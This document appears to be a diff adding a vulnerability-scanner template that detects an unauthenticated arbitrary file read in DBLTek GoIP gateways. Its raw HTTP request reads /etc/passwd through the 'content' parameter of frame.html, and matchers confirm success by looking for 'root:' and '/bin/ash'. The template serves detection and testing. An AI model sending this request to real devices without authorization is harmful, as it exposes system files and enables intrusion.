@@ -1,0 +1,25 @@
+id: dbltek-goip-arbitrary-file-read
+info:
+  name: Dbltek GoIP Arbitrary File Reading
+  author: ProjectDiscoveryAI
+  severity: critical
+  description: |
+    DBL DBLTek devices are a GOIP gateway product of the China Deborah (DBL) company. A security vulnerability in the web server allows attackers to arbitrarily read system file information without authorization.
+  reference:
+    - https://www.exploit-db.com/exploits/50775
+  tags: file-read
+http:
+  - raw:
+      - |
+        GET /default/en_US/frame.html?content=/etc/passwd HTTP/1.1
+        Host: {{Hostname}}
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - "root:"
+          - "/bin/ash"
